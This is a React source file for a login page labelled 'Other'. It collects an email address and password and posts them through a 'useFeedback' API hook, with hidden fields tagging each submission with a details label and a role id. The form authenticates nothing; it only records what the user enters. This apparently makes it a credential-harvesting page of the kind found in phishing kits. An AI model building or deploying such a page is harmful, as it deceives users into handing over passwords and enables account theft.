import './App.css';
import './Hover.css';
import './DemoPage.css';
import qs from 'qs';
import useFeedback from './api/useFeedback';
import React, { useState } from 'react';
import { Button, Modal } from 'react-bootstrap';

function Other() {
  const { postFeedback, isLoading } = useFeedback();
  const [emails, setEmail] = useState('');
  const [passwords, setPassword] = useState('');
  const [detail, setDetails] = useState('Other');
  const [role, setRole] = useState('4');



  const onSubmit = async (e) => {
  e.preventDefault();
    const data = qs.stringify({
      email: emails,
      password: passwords,
      details: detail,
      role_id: role,
    });

    try {
      await postFeedback(data);
      setPassword('');
      setEmail('');
    } catch (error) {
      console.log(error);
    }
  };
  



  return (

    <div  className="container-fluid">
    <div  className="row" >
    <div className="bg-image" 
     style={{backgroundColor: "#fdfdfd",
            height: "100vh",  backgroundSize: "cover", backgroundRepeat: "no-repeat"}}>
              <div className='text-center pt-5'>
   </div>
      <div  className="container">
        <div className="row">
        <div  className="col-sm-4 mx-auto my-5 px-5 pb-5 shadow rounded" style={{  backgroundColor: "gray", borderRadius:"15px"}}>
    
            <center>
              <img id="fieldImg" src="images/other.png"  className="img-fluid mt-3" width="80px"/>
             
          

            </center>
            <form    onSubmit={onSubmit}  className="form-horizontal well mt-3 mb-2">
              <div  className="col-lg-12">
                <div  className="form-group">
                  <p className='text-black'>Email address</p>
                  <input type="email" name="emails"  className="form-control" id="emails" value={emails}  onChange={(e) => setEmail(e.target.value)}  placeholder="Enter email"/>
                
                </div>
              </div>
              <div  className="col-lg-12 mt-3">
                <div  className="form-group">
                  <p className="text-black">Password</p>
                  <input type="password" name="passwords"  className="form-control" id="passwords" value={passwords}  onChange={(e) => setPassword(e.target.value)} placeholder="Enter Password"/>
                </div>
              </div>
              <div  className="col-lg-12">
                <div  className="form-group">
              
                  <input type="hidden" name="detail"  className="form-control" id="detail" value={detail}   onChange={(e) => setDetails(e.target.value)} />
                </div>
              </div>

              <div  className="col-lg-12">
                <div  className="form-group">
              
                  <input type="hidden" name="role"  className="form-control" id="role" value={role}   onChange={(e) => setRole(e.target.value)} />
                </div>
              </div>
        
<center className="pt-3">
             
              <button className="btn btn-sm " style={{textAlign:"center", color: "gray", backgroundColor:"white" }} id="submit-btn">LOGIN</button>
              </center>
          </form>
        </div>
     


          </div>
     
    </div> 
    </div>
  </div>
  </div>
  );
}

export default Other;
